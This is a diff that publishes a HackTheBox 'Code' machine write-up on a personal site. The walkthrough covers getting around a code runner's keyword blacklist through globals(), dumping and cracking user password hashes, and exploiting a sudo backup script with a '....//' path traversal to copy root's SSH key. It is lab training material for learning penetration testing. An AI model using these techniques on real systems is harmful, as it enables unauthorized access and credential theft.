@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Code - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Code.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Code machine from HackTheBox - Easy difficulty level">
+    <meta name="description" content="Detailed writeup for Code machine from HackTheBox - Easy difficulty level">
     <meta name="keywords" content="HackTheBox, Code, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,201 @@
         <h1 class="writeup-title">Code</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">Active machine</span>
+            <span class="date">August 2, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Code" src="../images/Code/pwned.png" /></p>
-<p>Code is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Code retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Code/pwned.png" /></p>
+<p>Code was an interesting Linux box that started with a Python code editor web application on port 5000.
+Initial reconnaissance revealed an online code execution environment with keyword blacklisting that prevented direct system command execution by blocking words like import, system, subprocess, and os.
+I bypassed the security controls by accessing Flask application globals through globals(), which exposed the SQLAlchemy database connection and User model.
+Using these objects, I extracted user credentials from the database, revealing two users: development:development and martin:nafeelswordsmaster. The MD5 password hashes were easily cracked using online tools.</p>
+<p>SSH access was gained using martin's credentials, where I discovered sudo privileges to execute a backup script (backy.sh) as root.
+Analysis of the script revealed a flawed path sanitization mechanism that used regex to strip ../ sequences from JSON configuration files containing directories to archive.
+The script only allowed archiving paths under /var/ and /home/ directories.</p>
+<p>I bypassed the regex by crafting a malicious JSON configuration with the path /home/....//root/, which after the ../ stripping became /home/../root/, effectively pointing to the root directory.
+This allowed me to backup the /root directory contents, including root's SSH private key.
+Using the extracted private key, I achieved full root access to the system, completing the privilege escalation chain.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Code/nmap.png" /></p>
+<p>The nmap scan reveals 2 ports. SSH on 22 and a website on 5000.</p>
+<h2>Enumerating the database and extracting users</h2>
+<p>It's a simple online code editor. It will execute any code written on the left pane and display the results on the right.</p>
+<p><img alt="code" src="../images/Code/code.png" /></p>
+<p>I tried to execute a system command, but was denied due to a blacklisted word.</p>
+<p><img alt="code1" src="../images/Code/code1.png" /></p>
+<p>I deduced that the words <code>import</code>, <code>system</code>, <code>subprocess</code>, and <code>os</code> are blacklisted. There are probably more, but these prevent me from getting easy code execution.</p>
+<p>After that, I turned my attention to the global variables. There could be a few interesting things to see there, like some information about the database, which I'm assuming exists because there is a login/register functionality on the website.</p>
+<p>I can get all of the global variables by running the script below.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">global_variables</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">globals</span><span class="p">()</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">global_variables</span><span class="p">)</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
+<span class="s1">&#39;request&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">Request</span><span class="w"> </span><span class="s1">&#39;http://10.10.11.62:5000/run_code&#39;</span><span class="w"> </span><span class="o">[</span><span class="n">POST</span><span class="o">]&gt;</span><span class="p">,</span>
+<span class="s1">&#39;jsonify&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">function</span><span class="w"> </span><span class="n">jsonify</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0x7fce6b4d5c10</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;redirect&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">function</span><span class="w"> </span><span class="n">redirect</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0x7fce6b33e3a0</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;url_for&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">function</span><span class="w"> </span><span class="n">url_for</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0x7fce6b33e310</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;session&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">SecureCookieSession</span><span class="w"> </span><span class="err">{}</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;flash&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">function</span><span class="w"> </span><span class="n">flash</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0x7fce6b33e550</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;SQLAlchemy&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">class</span><span class="w"> </span><span class="s1">&#39;flask_sqlalchemy.extension.SQLAlchemy&#39;</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;sys&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">module</span><span class="w"> </span><span class="s1">&#39;sys&#39;</span><span class="w"> </span><span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;io&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">module</span><span class="w"> </span><span class="s1">&#39;io&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="s1">&#39;/usr/lib/python3.8/io.py&#39;</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;os&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">module</span><span class="w"> </span><span class="s1">&#39;os&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="s1">&#39;/usr/lib/python3.8/os.py&#39;</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;hashlib&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">module</span><span class="w"> </span><span class="s1">&#39;hashlib&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="s1">&#39;/usr/lib/python3.8/hashlib.py&#39;</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;app&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">Flask</span><span class="w"> </span><span class="s1">&#39;app&#39;</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;db&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">SQLAlchemy</span><span class="w"> </span><span class="nl">sqlite</span><span class="p">:</span><span class="o">////</span><span class="n">home</span><span class="o">/</span><span class="n">app</span><span class="o">-</span><span class="n">production</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">instance</span><span class="o">/</span><span class="k">database</span><span class="p">.</span><span class="n">db</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;User&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">class</span><span class="w"> </span><span class="s1">&#39;app.User&#39;</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;Code&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">class</span><span class="w"> </span><span class="s1">&#39;app.Code&#39;</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;index&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">function</span><span class="w"> </span><span class="k">index</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0x7fce6a2788b0</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;register&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">function</span><span class="w"> </span><span class="n">register</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0x7fce6a278b80</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;login&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">function</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0x7fce6a278c10</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="s1">&#39;logout&#39;</span><span class="err">:</span><span class="w"> </span><span class="o">&lt;</span><span class="k">function</span><span class="w"> </span><span class="n">logout</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0x7fce6a278ca0</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
+</code></pre></div>
+
+<p>There are 2 variables that immediately caught my attention, <code>User</code> and <code>db</code>. With these two, connecting to the database should be possible, after which I'll be able to grab the user passwords.</p>
+<div class="codehilite"><pre><span></span><code>User = globals()[&#39;User&#39;]
+db = globals()[&#39;db&#39;]
+
+all_users = User.query.all()
+
+print(all_users)
+</code></pre></div>
+
+<p>The website runs on flask and uses sqlalchemy as an ORM for its database. I can use some built in utilities to traverse the DB and enumerate the users.</p>
+<p><img alt="users" src="../images/Code/users.png" /></p>
+<p>There are 2 users in the users table, but I need to refine the code in order to grab the proper information.</p>
+<div class="codehilite"><pre><span></span><code>User = globals()[&#39;User&#39;]
+db = globals()[&#39;db&#39;]
+
+all_users = User.query.all()
+
+output = &quot;&quot;
+for user in all_users:
+    output += f&quot;User: {getattr(user, &#39;username&#39;)}, Pass: {getattr(user, &#39;password&#39;)}\n&quot;
+
+print(output)
+</code></pre></div>
+
+<p>The added line will cause the script to browse through each user and grab their username + password.</p>
+<p><img alt="extract" src="../images/Code/extract.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="n">User</span><span class="o">:</span><span class="w"> </span><span class="n">development</span><span class="o">,</span><span class="w"> </span><span class="n">Pass</span><span class="o">:</span><span class="w"> </span><span class="mi">759</span><span class="n">b74ce43947f5f4c91aeddc3e5bad3</span>
+<span class="n">User</span><span class="o">:</span><span class="w"> </span><span class="n">martin</span><span class="o">,</span><span class="w"> </span><span class="n">Pass</span><span class="o">:</span><span class="w"> </span><span class="mi">3</span><span class="n">de6f30c4a09c27fc71932bfc68474be</span><span class="w"> </span>
+</code></pre></div>
+
+<p>I've got the users <code>development</code> and <code>martin</code>. These look like MD5 hashes, so I'll navigate to crackstation first before using hashcat.</p>
+<p><img alt="hashes" src="../images/Code/hashes.png" /></p>
+<p><code>development | development</code></p>
+<p><code>martin | nafeelswordsmaster</code></p>
+<p>Development's credentials worked on the website, but there was nothing interesting revealed.</p>
+<p>However, Martin's credentials worked for SSH authentication.</p>
+<p><img alt="fakeupser" src="../images/Code/fakeuser.png" /></p>
+<p>There is no user flag in Martin's home directory. It must be in <code>app-production</code>, but Martin can execute a script as root. I probably skipped a step or two and was supposed to pivot to Martin from app-production.</p>
+<h2>Examining the backup script</h2>
+<div class="codehilite"><pre><span></span><code><span class="c1"># backy.sh</span>
+
+<span class="c1">#!/bin/bash</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">[[</span><span class="w"> </span><span class="o">$</span><span class="c1"># -ne 1 ]]; then</span>
+<span class="w">    </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="s2">&quot;Usage: $0 &lt;task.json&gt;&quot;</span>
+<span class="w">    </span><span class="n">exit</span><span class="w"> </span><span class="mi">1</span>
+<span class="n">fi</span>
+
+<span class="n">json_file</span><span class="o">=</span><span class="s2">&quot;$1&quot;</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">[[</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="s2">&quot;$json_file&quot;</span><span class="w"> </span><span class="p">]];</span><span class="w"> </span><span class="n">then</span>
+<span class="w">    </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="s2">&quot;Error: File &#39;$json_file&#39; not found.&quot;</span>
+<span class="w">    </span><span class="n">exit</span><span class="w"> </span><span class="mi">1</span>
+<span class="n">fi</span>
+
+<span class="n">allowed_paths</span><span class="o">=</span><span class="p">(</span><span class="s2">&quot;/var/&quot;</span><span class="w"> </span><span class="s2">&quot;/home/&quot;</span><span class="p">)</span>
+
+<span class="n">updated_json</span><span class="o">=$</span><span class="p">(</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">jq</span><span class="w"> </span><span class="s1">&#39;.directories_to_archive |= map(gsub(&quot;</span><span class="se">\\</span><span class="s1">.</span><span class="se">\\</span><span class="s1">./&quot;; &quot;&quot;))&#39;</span><span class="w"> </span><span class="s2">&quot;$json_file&quot;</span><span class="p">)</span>
+
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="s2">&quot;$updated_json&quot;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="s2">&quot;$json_file&quot;</span>
+
+<span class="n">directories_to_archive</span><span class="o">=$</span><span class="p">(</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="s2">&quot;$updated_json&quot;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">jq</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="s1">&#39;.directories_to_archive[]&#39;</span><span class="p">)</span>
+
+<span class="n">is_allowed_path</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">local</span><span class="w"> </span><span class="n">path</span><span class="o">=</span><span class="s2">&quot;$1&quot;</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">allowed_path</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="s2">&quot;${allowed_paths[@]}&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">do</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">[[</span><span class="w"> </span><span class="s2">&quot;$path&quot;</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">$</span><span class="n">allowed_path</span><span class="o">*</span><span class="w"> </span><span class="p">]];</span><span class="w"> </span><span class="n">then</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="n">fi</span>
+<span class="w">    </span><span class="n">done</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
+
+<span class="k">for</span><span class="w"> </span><span class="n">dir</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">$</span><span class="n">directories_to_archive</span><span class="p">;</span><span class="w"> </span><span class="n">do</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="n">is_allowed_path</span><span class="w"> </span><span class="s2">&quot;$dir&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">then</span>
+<span class="w">        </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="s2">&quot;Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.&quot;</span>
+<span class="w">        </span><span class="n">exit</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">    </span><span class="n">fi</span>
+<span class="n">done</span>
+
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">backy</span><span class="w"> </span><span class="s2">&quot;$json_file&quot;</span>
+</code></pre></div>
+
+<p>This script takes in a <code>task.json</code> file, takes the <code>directories_to_archive</code> section, looks for the <code>../</code> string and strips it off from the data, in an attempt to prevent the users from reaching forbidden directories.</p>
+<p>If the directory to archive does not contain <code>/var/</code> or <code>/home/</code>, it'll error out.</p>
+<div class="codehilite"><pre><span></span><code>{
+        &quot;destination&quot;: &quot;/home/martin/backups/&quot;,
+        &quot;multiprocessing&quot;: true,
+        &quot;verbose_log&quot;: false,
+        &quot;directories_to_archive&quot;: [
+                &quot;/home/app-production/app&quot;
+        ],
+
+        &quot;exclude&quot;: [
+                &quot;.*&quot;
+        ]
+}
+</code></pre></div>
+
+<p>This is an example task.json file. I'll modify it to copy the contents of <code>/home/app-production</code></p>
+<div class="codehilite"><pre><span></span><code>{
+        &quot;destination&quot;: &quot;/home/martin/backups&quot;,
+        &quot;multiprocessing&quot;: true,
+        &quot;verbose_log&quot;: false,
+        &quot;directories_to_archive&quot;: [
+                &quot;/home/app-production&quot;
+        ]
+}
+</code></pre></div>
+
+<p><img alt="archived" src="../images/Code/archived.png" /></p>
+<p>I will copy over the archive onto my box using scp.</p>
+<p><code>scp martin@10.10.11.62:/home/martin/backups/code_home_app-production_2025_August.tar.bz2 .</code></p>
+<p>Then, I will perform 2 operation on the archive to extract its contents. First, getting rid of the bzip extension.</p>
+<p><img alt="extract1" src="../images/Code/extract1.png" /></p>
+<p>This creates a .tar archive, which I can extract using <code>tar -xf</code></p>
+<p><img alt="extract2" src="../images/Code/extract2.png" /></p>
+<h1>Root flag</h1>
+<p>For the root flag, I'll keep using the backy script. I will backup the /root directory, but that'll require a few changes.</p>
+<div class="codehilite"><pre><span></span><code>{
+        &quot;destination&quot;: &quot;/home/martin/&quot;,
+        &quot;multiprocessing&quot;: true,
+        &quot;verbose_log&quot;: false,
+        &quot;directories_to_archive&quot;: [
+                &quot;/home/....//root/&quot;
+        ]
+}
+</code></pre></div>
+
+<p>Since the regex in backy.sh strips off the <code>../</code> string, directories to archive will become <code>/home/../root/</code>, which is exactly what I want.</p>
+<p>However, I could not get it working from the /tmp directory. Once I changed the original script at <code>/home/martin/backups</code> though, it worked flawlessly.</p>
+<p><img alt="rootback" src="../images/Code/rootback.png" /></p>
+<p>I transferred it and unpacked it the same way as the earlier archive.</p>
+<p><img alt="id" src="../images/Code/id.png" /></p>
+<p><code>chmod +600 id_rsa</code></p>
+<p>I'll use the key to ssh into the box as root.</p>
+<p><code>ssh -i id_rsa root@10.10.11.62</code></p>
+<p><img alt="root" src="../images/Code/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
